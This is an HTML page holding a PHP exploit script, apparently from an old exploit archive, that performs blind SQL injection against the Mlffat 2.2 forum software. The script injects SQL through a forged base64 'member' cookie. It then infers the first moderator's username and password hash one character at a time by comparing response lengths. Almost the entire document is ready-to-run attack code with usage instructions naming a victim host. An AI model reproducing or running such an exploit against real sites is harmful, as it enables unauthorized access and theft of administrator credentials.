<html><head><title>Mlffat 2.2 Remote Blind SQL Injection Exploit</title></head><pre>&lt;?php
ini_set(&quot;max_execution_time&quot;,0);
print_r('
                                       ||          ||   | ||
                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
                               (  :  /    (_)    /           (      .

                                        ___________________
                                      _/QQQQQQQQQQQQQQQQQQQ\__
[q] Mlffat 2.2 Blind SQL Inj.      __/QQQ/````````````````\QQQ\___
                                 _/QQQQQ/                  \QQQQQQ\
[q] Cookie &lt;3                   /QQQQ/``                    ```QQQQ\
                               /QQQQ/                          \QQQQ\
[q] http://www.mlffat.com     |QQQQ/    By  Qabandi             \QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ|    From Kuwait, PEACE...   |QQQQ|
                              |QQQQ|                            |QQQQ|
                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
[/]   -[Tam al tableegh]-      \QQQQ\                      __  /QQQQ/
                                \QQQQ\                    /QQ\_QQQQ/
                                 \QQQQ\                   \QQQQQQQ/
                                  \QQQQQ\                 /QQQQQ/_
                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
                                         ```````````````````     `````
 ______________________________________________________________________________
/                                                                              \
|                          Sec-Code.com ;)    Join the revolution              |
\______________________________________________________________________________/
                                \ No More Private /
                                 `````````````````
');

if ($argc&lt;6) {
print_r('
-----------------------------------------------------------------------------
Usage:   php '.$argv[0].' VICTIM DIR user_id username password
--VICTIM == the website that has the script installed.
--DIR    == Directory of script, /mlffat/ or // for root dir
--user_id== Your user ID (you must register)
--username= your username
--password= your password

example: php '.$argv[0].' mlffat.com /demo/ 1 mlffat test

or if in root dir:
example: php '.$argv[0].' EXAMPLE.com // 1 mlffat test
-----------------------------------------------------------------------------
');
die;
}
 function QABANDI($victim,$vic_dir,$user_id,$user_name,$user_pass,$injection){
$host = $victim;
$usrid= $user_id;
$usrnm= $user_name;
$usrpw= $user_pass;
$p = &quot;http://&quot;.$host.$vic_dir;

$user_id_inj = $usrid.$injection;
$qookie = base64_encode($user_id_inj.&quot;:&quot;.$usrnm.&quot;:&quot;.md5($usrpw));
          $packet =&quot;GET &quot;.$p.&quot;index.php?action=account&amp;view=editprofile HTTP/1.0\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: member=&quot;.$qookie.&quot;;\r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
        //  if ($debug == 1){
        // print $qookie.&quot;\n\n&quot;;
         // }
	$o = @fsockopen($host, 80);
	if(!$o){
		echo &quot;\n[x] No response...\n&quot;;
		die;
	}
	
	fputs($o, $packet);
	while (!feof($o)) $data .= fread($o, 1024);
	fclose($o);
	
	$_404 = strstr( $data, &quot;HTTP/1.1 404 Not Found&quot; );
	if ( !empty($_404) ){
		echo &quot;\n[x] 404 Not Found... Make sure of path. \n&quot;;
		die;
	}

                                           return $data;

 }

$host1 = $argv[1];
$userdir1=$argv[2];
$userid1= $argv[3];
$username1= $argv[4];
$userpass1= $argv[5];






if ($argc &gt; 2) {

echo &quot;\nPlease wait, this will take time, el9abr zain ;)\n&quot;;
$r = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,&quot;' and 1='1&quot;));
echo &quot;\nExploiting:\n&quot;;
$w = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,&quot;' and 1='0&quot;));
$t = abs((100-($w/$r*100)));
echo &quot;Username: &quot;;
for ($i=1; $i &lt;= 30; $i++) {

  $q = QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,&quot;' and ascii(substring((select name from mlffat_moderators limit 0,1),&quot;.$i.&quot;,1))!='0&quot;);

$laenge = strlen($q);
   if (abs((100-($laenge/$r*100))) &gt; $t-1) {
      $count = $i;
      $i = 30;
   }
}
for ($j = 1; $j &lt; $count; $j++) {
   for ($i = 46; $i &lt;= 122; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }



      $laenge = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,&quot;' and ascii(substring((select name from mlffat_moderators limit 0,1),&quot;.$j.&quot;,1))&gt;'&quot;.$i));

            

      if (abs((100-($laenge/$r*100))) &gt; $t-1) {




                  $laenge = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,&quot;' and ascii(substring((select name from mlffat_moderators limit 0,1),&quot;.$j.&quot;,1))&gt;'&quot;.($i-1)));





      

         if (abs((100-($laenge/$r*100))) &gt; $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 122;
      }
   }
}
echo &quot;\nPassword: &quot;;
for ($j = 1; $j &lt;= 49; $j++) {
   for ($i = 46; $i &lt;= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      

   //          if ($j&gt;9){

 //    $hg=QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,&quot;' and ascii(substring((select Password from mlffat_moderators limit 0,1),&quot;.$j.&quot;,1)) &gt; '&quot;.$i);


       //      }
             
             //             if ($j&lt;9){

 //    $hg=QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,&quot;' and ascii(substring((select Password from mlffat_moderators limit 0,1),&quot;.$j.&quot;,1)) &gt; '&quot;.$i);

  
     //        }
                             //         if ($j=9){

     $hg=QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,&quot;' and ascii(substring((select Password from mlffat_moderators limit 0,1),&quot;.$j.&quot;,1)) &gt; '&quot;.$i,1);


      //       }

      $laenge = strlen($hg);

      if (abs((100-($laenge/$r*100))) &gt; $t-1) {
        
        

         $laenge = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,&quot;' and ascii(substring((select Password from mlffat_moderators limit 0,1),&quot;.$j.&quot;,1)) &gt; '&quot;.($i-1),1));


         if (abs((100-($laenge/$r*100))) &gt; $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 102;
      }
   }
}
}
?&gt;

# milw0rm.com [2009-07-09]</pre></html>